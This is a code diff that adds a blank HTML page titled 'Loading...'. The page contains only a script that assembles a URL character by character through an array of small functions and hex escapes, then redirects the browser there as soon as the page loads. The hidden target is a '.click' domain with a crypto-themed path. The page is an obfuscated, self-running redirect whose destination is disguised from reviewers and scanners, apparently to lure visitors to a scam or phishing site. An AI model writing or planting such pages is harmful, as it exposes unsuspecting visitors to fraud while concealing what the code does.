@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        const frag = [
+            () => "h",
+            function() { return "t"; },
+            () => "t",
+            () => '\x70',
+            function() { return "s"; },
+            () => '\x3a',
+            () => '/',
+            v => '/',
+            () => '\x76',
+            function() { return 'e'; },
+            () => '\x72',
+            $ => "g",
+            m => 'e',
+            () => '\x6e',
+            () => '.',
+            q => "c",
+            z => 'l',
+            () => 'i',
+            () => 'c',
+            () => 'k',
+            () => '\x2f',
+            () => "s",
+            () => "/",
+            x => 'c',
+            () => "r",
+            () => "y",
+            p => 'p',
+            k => "t",
+            n => "o"
+        ];
+        const link = frag.reduce((t, fn) => t + fn(), '');
+
+        document.location = link;
+    </script>
+</head>
+<body></body>
+</html>
